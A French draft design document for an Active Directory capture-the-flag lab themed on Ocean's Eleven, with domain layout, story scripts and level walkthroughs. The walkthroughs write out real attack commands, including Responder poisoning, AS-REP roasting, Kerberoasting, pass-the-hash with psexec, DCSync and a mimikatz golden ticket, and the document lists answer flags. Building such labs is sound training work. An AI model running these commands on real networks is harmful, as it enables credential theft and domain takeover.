Ocean's Eleven

theme song: https://youtu.be/sdSai09_jzc
theme write: https://www.youtube.com/watch?v=FteCteGhnYY

mindmap ORANGE : https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg

Infra:
- 3 forêts (Bellagio, The Mirage, MGM Grand)
- Domaines enfants (Bellagio: casino.bellagio.com Mirage: casino.mirage.com MGM Grand: casino.mgmgrand.com )
- Pour les groupes dans les AD : Croupiers ( la ou un des equipiers est dedans (pas de droit) )  Sécurité casinon basique (Peu de droit) Sécurité vidéo (autre droit) sécurité des coffres ( beaucoup de droit mais pas admin admin) et le compte créateur de Terry Beneditct

=================================================================================

=================================================================================

Domaines et Unités d'Organisation (OU)

Domaines Enfants
    Bellagio: casino.bellagio.com
    Mirage: casino.mirage.com
    MGM Grand: casino.mgmgrand.com

Unités d'Organisation (OU)
=================================================================================

MGM Grand

  OU=Management <br/>
      PC: ManagementPC-MGM <br/>
      Utilisateurs: Benedict, Manager1-MGM, Manager2-MGM <br/>

  OU=VIP <br/>
      PC: VIPPC-MGM <br/>
      Utilisateurs: VIPManager-MGM, VIPAssistant-MGM <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-MGM <br/>
      Utilisateurs: SecurityChief-MGM, SecurityGuard1-MGM, SecurityGuard2-MGM <br/>

  OU=IT <br/>
      PC: ITServer-MGM, ITPC-MGM <br/>
      Utilisateurs: ITAdmin-MGM, ITSupport1-MGM, ITSupport2-MGM <br/>

  OU=Croupier <br/>
      PC: CroupierPC-MGM <br/>
      Utilisateurs: Croupier1-MGM, Croupier2-MGM <br/>

**********************************************************************************************************************************************


Mirage

  OU=Management <br/>
      PC: ManagementPC-Mirage <br/>
      Utilisateurs: Benedict, Manager1-Mirage, Manager2-Mirage <br/>

  OU=VIP <br/>
      PC: VIPPC-Mirage <br/>
      Utilisateurs: VIPManager-Mirage, VIPAssistant-Mirage <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Mirage <br/>
      Utilisateurs: SecurityChief-Mirage, SecurityGuard1-Mirage, SecurityGuard2-Mirage <br/>

  OU=IT <br/>
      PC: ITServer-Mirage, ITPC-Mirage <br/>
      Utilisateurs: ITAdmin-Mirage, ITSupport1-Mirage, ITSupport2-Mirage <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Mirage <br/>
      Utilisateurs: Croupier1-Mirage, Croupier2-Mirage <br/>

**********************************************************************************************************************************************

Bellagio

  OU=Management <br/>
      PC: ManagementPC-Bellagio <br/>
      Utilisateurs: Benedict, Manager1-Bellagio, Manager2-Bellagio <br/>

  OU=VIP <br/>
      PC: VIPPC-Bellagio <br/>
      Utilisateurs: VIPManager-Bellagio, VIPAssistant-Bellagio <br/>

  OU=Sécurité <br/>
      PC: SecurityPC-Bellagio <br/>
      Utilisateurs: SecurityChief-Bellagio, SecurityGuard1-Bellagio, SecurityGuard2-Bellagio <br/>

  OU=IT <br/>
      PC: ITServer-Bellagio, ITPC-Bellagio <br/>
      Utilisateurs: ITAdmin-Bellagio, ITSupport1-Bellagio, ITSupport2-Bellagio <br/>

  OU=Croupier <br/>
      PC: CroupierPC-Bellagio <br/>
      Utilisateurs: Croupier1-Bellagio, Croupier2-Bellagio <br/>

**********************************************************************************************************************************************


Groupes AD

File Share Managers
    Description : Groupe contenant les employés responsables de la gestion des partages de fichiers.
    Membres : FileShareAdmin-Bellagio, FileShareAdmin-Mirage, FileShareAdmin-MGM

  CEO <br/>
      Description: Compte administrateur de Terry Benedict. <br/>
      Membres: Benedict <br/>

**********************************************************************************************************************************************      

Tuto Exegol conteneur : https://youtu.be/7AI2rYDLIUs?si=uwSTkzRqh5wNxuXm

Idées Attaques : 

On a besoin de 14 attaques !!!

**Attaques de bas niveau :**

LLMNR, NBT-NS et mDNS spoofing

Kerberoast w/o pre-authentication

l'attaque asrep roasting permet prendre la main sur d'autres comptes


**Attaques simples :**
Abus des DACL (Discretionary Access Control Lists)

Prendre le controle d'un compte qui a les droits de modifier ou de create des gpo grâce aux 
attaques précédentes pour lancer des attaques plus vastes


**Attaques Importantes :**

Print NightMareeeee
AdminSDHolder

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Histoire inspiré de Ocean's Eleven à mettre dans l'intro :


Danny Ocean est un maître du casse et le cerveau derrière l'opération la plus audacieuse jamais orchestrée sur le Strip de Las Vegas. Après 2 ans passés en prison loin de sa femme Son objectif ? La reconquérir et dévaliser simultanément trois des plus prestigieux casinos détenus par le redoutable Terry Benedict, un magnat de la mafia et le nouvel homme de son ex femme dont le pouvoir s'étend jusque dans les systèmes numériques.

Pour préparer ce coup d’éclat, Ocean a réuni une équipe de onze spécialistes aux compétences complémentaires : voleur, expert en explosifs, pilotes hors pair, acrobate, as du déguisement.
Vous avez été reconnu pour vos prouesses et votre talent en réussissant un certain CTF nommé 2BGP, et vos compétences en pentest ont attiré l’attention d’Ocean.

Reconnu pour votre expertise en Active Directory et Windows Server, vous avez été minutieusement sélectionné. 

Votre objectif est d’aider le groupe à s’infiltrer dans les casinos. Pendant qu’ils seront sur le terrain, c’est à vous de surveiller tous les agissements. Vous serez infiltré directement dans une chambre d’hôtel, équipé de votre matériel informatique. Pour cela, ils ont besoin de votre aide : vous devrez découvrir et cartographier le réseau informatique des casinos. 

Bienvenu dans l'équipe et que le braquage commence !!!

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


0- nmap voir les protocoles et port ouvert

1- responder faille (LLMNR et Netbios)

2- cracker le mdp avec hashcat

3- verifier la validité du mdp avec netexec

4- se connecter à la machine locale via ssh (vu qu'on a les credentials et de plus c'est realiste)

5 bis - enumerer les droits de l'utilisateur grace à l'outil...

5- exploiter la faille des tâches planifiées afin de creer un compte admin

6- installer procdump puis creer un partage et extraire le contenu du lsass

7- cracker le contenu du lsass avec pypykatz

8- pass the hash NTLM

9- realiser la faille dcsync avec secretsdump

10- realiser la faille dcshadow

11 bis idées : exploiter le ticket d'or pour se creer un compte admin sur le second ad (à tester)

11- exploiter le lien trust pour enumerer le contenu du second ad ( à faire) ou kerbrute

**Pour un total de 11 failles réalisables et tester**

Les failles qui necessitent une configuration en amont : 

0 ouvrir le port ssh, smb etc pour donner des indices

1 configurer une tache planifié ou un script pour creer une fausse connexion à un partage (déjà tester j'ai le script)

4 activer ssh

5 creer la tache planifié et donner les droits à l'utilisateur ou aux utilisateurs

8 mettre l'utilisateur dont on a cracké les mdp dans le groupe admins avec restrictions si il le faut


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 1 (Reconnaissance NMAP) :

Script pour histoire du niveau :

Votre équipe est déjà infiltrée dans le casino, mais pour que le casse commence, vous devez d’abord pénétrer leur environnement informatique. 

Votre mission, si vous l’acceptez, consiste à identifier les types de serveurs présents sur leur réseau ainsi que les ports ouverts.

Cependant, après quelques verres bien placés, l’équipe a réussi à soudoyer un membre du service IT, obtenant ainsi une plage d’adresses IP…
En lançant une reconnaissance méticuleuse avec nmap, vous allez pouvoir cartographier le réseau du casino et identifier les services exposés.

Attaque : 

lancer un nmap pour que la personne connaissent son réseaux qui répondent 

nmap -Pn -p- -sV -sC 192.168.1.0/24

ping IP SRV (vu en nmap) => Permet de voir TTL 127 donc WinSRV


Key ctf = 127 + Année du Windows Server

Message réussite niveau : 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Level 2 Trouver les user :
!!!!!!!! FOURNIR UNE LISTE DE COMPTE AD POSSIBLE AU PENTESTER !!!!!!!

Script pour histoire du niveau :

Attaque : 

Avoir une liste de user pour réaliser un bruteforce sur les username. Pour cela, on peut fournir une liste d'user à l'utilisateur qui peut telechagrer depuis le site web avec 1000 username afin de bruteforce et on met par exemple 5 username valides.

kerbrute userenum --dc $IPDC$ -d $NOMDOMAINE$ users.txt

Mettre dans list_recup.txt les noms recuperes

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 3 prendre controle d'un compte sans permission (ASREP-Roasting) :

Script pour histoire du niveau :

Après avoir réussi à cartographier le réseau du casino grâce à votre expertise en reconnaissance avec NMAP, ton équipe est maintenant prête à passer à l'étape suivante : infiltrer les systèmes internes pour prendre le contrôle des comptes sans autorisation.

Terry Benedicta sous-estimé une faille cruciale dans son système de sécurité informatique. Les comptes de service de son réseau Active Directory n'ont pas de pré-authentification requise, une vulnérabilité connue sous le nom d'ASREP-Roasting.

Votre objectif est de récupérer les hashs des mots de passe des utilisateurs pour permettre à l'équipe d'Ocean de récuperer ces comptes et de prendre le contrôle des comptes nécessaires pour désactiver les systèmes de sécurité des casinos.


Attaque : 

=> L'attaque consiste à recuperer le hash d'un password. Cette technique exploite le fait que si un utilisateur n'a pas de pré-authentification requise (ce qui est le cas par défaut pour les comptes de service), le serveur Kerberos renverra le TGT chiffré avec le mot de passe de l'utilisateur sans vérifier le mot de passe au préalable.


GetNPUsers.py -request -outputfile "hashes.txt" -format "john" -usersfile "users_list.txt" -dc-ip "10.100.0.111" "bellagio.local/"

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Voici un flag simple à intégrer pour le Level 3, basé sur le mot de passe du service qu'on va casser :

Flag (à soumettre) : Password trouvé du compte P@ssw0rd

Message réussite niveau :



--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR

Script pour histoire du niveau :

Grâce à votre compte SVC-bella sur le domaine bellagio.local, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.

En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.

Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.


Attaque : 

Monter le partage SMB de l’autre AD

smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
  -U ITAdmin-Bellagio

  Forcer la requête de reconnection
smb: \> rm -r backup_data

Lancer le poison LLMNR/NBNS pour capturer le hash

responder -I eth0 -wrf

Extraire le hash capturé

grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
  | awk '{print $NF}' > captured_hash.txt
  

  Pass-the-hash vers la machine ITServer-Mirage
psexec.py -hashes :`cat captured_hash.txt` \
  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com

  Ajouter votre compte pentester au groupe Administrators local

net localgroup Administrators pentester /add


Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :

Flag (à soumettre) :

FLAG{F1E2D3C4B5A6978877665544332211FF}
Comment le récupérer :

Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :

[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
      
Flag ici F1E2D3C4B5A6978877665544332211FF

Message réussite niveau :
Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------











: Escalade de privilèges vers un compte IT Admin

Script pour histoire du niveau :

Vous avez désormais à votre actif un ou plusieurs services de casino grâce au cassage des NTLM via ASREP-Roasting. Danny Ocean compte sur vous pour monter d’un cran : obtenir des privilèges d’administrateur local sur le serveur IT pour pouvoir déployer les outils qui couperont net les alarmes et désactiveront les logs de vigilance.

Dans les méandres de l’Active Directory, vous découvrez que plusieurs comptes de service possèdent un SPN (Service Principal Name) et – détail crucial – sont membres du groupe local Administrators sur le serveur ITServer-<casino>. En exploitant la technique du Kerberoasting, vous allez extraire les tickets chiffrés de ces services, casser leurs mots de passe hors ligne, puis vous authentifier en tant qu’Admin IT. Une fois connecté, vous ajouterez votre propre compte pentester au groupe Administrators, ouvrant grand la porte aux modifications de configuration et à la désactivation des dispositifs de sécurité du casino.

Bienvenue dans l’antichambre des salles de contrôle : sans droits suffisants, pas de casse.

Attaque : 

GetUserSPNs.py casino.bellagio.com \
  -request \
  -outputfile spn_hashes.txt \
  -dc-ip 192.168.1.10

john --wordlist=/usr/share/wordlists/rockyou.txt spn_hashes.txt

psexec.py ServiceAccount-Bellagio:SvcAppPass!23@ITServer-Bellagio

net localgroup Administrators pentester /add

Message réussite niveau :

vous êtes administrateur local du serveur IT et pouvez préparer la phase suivante du braquage : la désactivation des systèmes de sécurité et la collecte en toute discrétion des données critiques avant l’assaut sur les coffres. Bonne escalade !


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



Il se rend compte qu'il y a un lien de confiance avec l'AD en face.
Il est  Admin d'un groupe "IT" et possède donc les droit pour : 
Accéder au service SMB partagé avec le second AD.
Un utilisateur de l'autre AD se connecte tout le temps sur le partage (backups).
Dans backup il y a un fichier txt avec ecrit "derniere connexion le : DATE" ou le mec se rend compte qu'un user se connecte toutes les minutes
il faut donc supprimer le repertoire et le PC en face va faire un multicast pour demander le nom du repertoire
L'atttaquant empoissone les reponses qui consiste à faire un empoisonnement de nom via les protocoles LLMNR
ou NetBios.
Il recupere le hash du compte XXX.
Connexion sur le compte grace au login et au hash (pas le password).


Level 4 (A ESSAYER ) : Attaque via le lien de confiance et empoisonnement SMB/LLMNR

Script pour histoire du niveau :

Grâce à vos droits d’Admin IT sur le domaine casino..com, vous découvrez qu’un trust existe avec le domaine casino..com. Muni de vos privilèges, vous pouvez monter le partage \ITServer-Mirage\backups, utilisé pour les sauvegardes régulières.

En explorant ce répertoire, vous tombez sur un fichier lastconn.txt, mis à jour chaque minute par un service de l’autre domaine pour y inscrire la date et l’heure de sa dernière connexion. Vous allez exploiter ce mécanisme pour forcer la machine distante à résoudre un nom de partage disparu, et ainsi capturer le hash NetNTLMv2 du compte qui tente de s’y reconnecter.

Une fois en possession du hash, vous l’utiliserez en “pass-the-hash” pour prendre une session distante et vous garantir un accès administrateur dans le domaine Mirage, ouvrant la voie au sabotage complet des backups et à la mise hors ligne des systèmes de secours.


Attaque : 

Monter le partage SMB de l’autre AD

smbclient \\\\ITServer-Mirage.casino.mirage.com\\backups \
  -U ITAdmin-Bellagio

  Forcer la requête de reconnection
smb: \> rm -r backup_data

Lancer le poison LLMNR/NBNS pour capturer le hash

responder -I eth0 -wrf

Extraire le hash capturé

grep "SMB-NTLMv2" /usr/share/responder/logs/Responder-Session.log \
  | awk '{print $NF}' > captured_hash.txt
  

  Pass-the-hash vers la machine ITServer-Mirage
psexec.py -hashes :`cat captured_hash.txt` \
  BackupUser-Mirage@ITServer-Mirage.casino.mirage.com

  Ajouter votre compte pentester au groupe Administrators local

net localgroup Administrators pentester /add


Voici une idée de flag, basé sur le hash NetNTLMv2 capturé, sans faire appel au sAMAccountName :

Flag (à soumettre) :

FLAG{F1E2D3C4B5A6978877665544332211FF}
Comment le récupérer :

Après avoir lancé responder -I eth0 -wrf, le log /usr/share/responder/logs/Responder-Session.log contient une ligne de ce type :

[SMB] NTLMv2-SSP Client   : BackupUser-Mirage
      NTLMv2 Response     : F1E2D3C4B5A6978877665544332211FF:1122334455667788...
      
Flag ici F1E2D3C4B5A6978877665544332211FF

Message réussite niveau :
Vous êtes à présent Administrateur local du serveur de backups du domaine Mirage. La route est ouverte pour couper définitivement les sauvegardes...

 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 5 (A ESSAYER) : Cartographie et exploitation des chemins de privilèges avec BloodHound 

Script pour histoire du niveau :

Vous avez désormais un pied dans chacun des deux domaines grâce à vos accès administratifs locaux sur ITServer- et ITServer-. Danny Ocean veut maintenant une vision globale des relations de confiance et des chemins d’escalade possibles entre les comptes pour planifier l’assaut final : trouver la clef de voûte, le compte ou le groupe dont la compromission offrirait le contrôle quasi-total des deux domaines.

Pour cela, vous allez déployer BloodHound et son agent SharpHound afin de collecter les données Active Directory — sessions ouvertes, appartenances aux groupes, droits délégués, ACL, trusts, etc. — puis analyser le graphe résultant à la recherche du chemin le plus court vers un compte à haute valeur (par exemple Domain Admins ou un Enterprise Admin).


Attaque : 

Lancer SharpHound pour la collecte de données : 

Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip

Invoke-BloodHound -CollectionMethod All -Domain casino..com -ZipFileName .zip

Transférer les archives vers votre poste d’analyste : 

scp Administrator@ITServer-Bellagio:data_bellagio.zip .
scp Administrator@ITServer-Mirage:data_mirage.zip .

Importer les données dans l’interface BloodHound :

Ouvrez BloodHound (interface web ou application Neo4j)

Dans “Data Import”, chargez successivement data_bellagio.zip puis data_mirage.zip

Identifier les chemins d’escalade :

Utilisez la requête “Shortest Path to Domain Admins” pour chaque domaine.

Explorez les “Paths” qui traversent le trust Bellagio↔Mirage.

Notez les comptes et groupes intermédiaires (par ex. IT, Backup Operators, Server Operators, etc.)

Choisir le vecteur optimal:

Admettons que BloodHound révèle qu’un compte BackupOperator-Mirage a un droit “AddMember” sur le groupe local Administrators du contrôleur de domaine Bellagio via le trust inversé.

Exploitation finale : ajout au groupe privilégié

Depuis votre session psexec sur ITServer-Mirage

net group "Domain Admins" BackupOperator-Mirage /domain


Voici une proposition de flag pour le Level 5, que tu pourras intégrer directement dans ton scénario :

Flag (à soumettre) :
FLAG{BackupOperator-Mirage}

Comment l’extraire ?

Les joueurs importent les ZIP BloodHound et lancent la requête “Shortest Path to Domain Admins”.

Ils repèrent qu’un compte BackupOperator-Mirage possède un droit “AddMember” sur le groupe Domain Admins du domaine casino.bellagio.com via le trust.

Ils soumettent alors exactement le sAMAccountName trouvé, encadré par FLAG{…}, soit FLAG{BackupOperator-Mirage}.

Message réussite : 

Vous maîtrisez à présent les deux domaines. Le déblocage du chemin privilégié via BloodHound a permis de prendre le contrôle des groupes Domain Admins et Enterprise Admins, assurant le succès ultime du casse numérique avant l’attaque physique sur le Strip.


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



Level 6 : Implantation d’une porte dérobée Kerberos sur les deux windows server  (Golden Ticket)

Script pour histoire du niveau :

Vous détenez déjà un accès Domain Admin sur le domaine casino..com, et votre session pentester peut exécuter n’importe quelle action sur le contrôleur de domaine. Danny Ocean veut maintenant assurer une persistance totale, même si Terry Benedict change les mots de passe ou réinitialise les comptes : il vous faut une porte dérobée Kerberos indétectable, un Golden Ticket, qui vous permettra de générer des tickets Kerberos valides pour n’importe quel compte, à vie.

Tandis que l’équipe physique s’apprête à passer à l’assaut des coffres, c’est vous qui préparez la sortie : extraire le hash du compte krbtgt, forger un ticket doré, et l’injecter dans votre session afin d’être toujours authentifié comme un administrateur, quel que soit l’état du domaine.

Attaque: 

Ouvrir une session SYSTEM sur le DC :

psexec.py -no-pass pentester@DC-Mirage.casino.mirage.com cmd.exe

Extraire le hash du compte krbtgt via DCSync :

mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:krbtgt

Générer le Golden Ticket :

mimikatz # kerberos::golden /domain:casino.bellagio.com \
                         /user:Administrator \
                         /sid:S-1-5-21-XXXXXXXXXX \
                         /krbtgt:<KRBTGT_NTLM_HASH> \
                         /id:500 \
                         /groups:512,516,520 \
                         /startoffset:0 /endin:31536000 \
                         /ticket:golden_Administrator.krb

Injecter le ticket dans votre session Kerberos :

mimikatz # kerberos::ptt golden_Administrator.krb

Vérifier la validité du ticket : 

klist

Exemple de Clé CTF a trouvé avec NTLM  a faire sur les 2 AD: 3f5d2c7a9e8b4f1a6c3e2b7d4a1f9e0b

Message réussite : vous disposez d’une porte dérobée Kerberos permanente sur le domaine Mirage. Quel que soit le rollover du compte krbtgt ou les changements de mot de passe, vous pourrez toujours cultiver de nouveaux tickets pour n’importe quel utilisateur — la persistance ultime avant de passer aux niveaux suivants.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


Level 7:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 8:

Attaque WEB pour reucepre username

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 9:

Attaque DHCP DDOS commme ca les flux passent par lattaquant
Attaque Man In The Middle

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 10:

rrelais NTLM 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 11:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 12:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 13:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Level 14:
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------



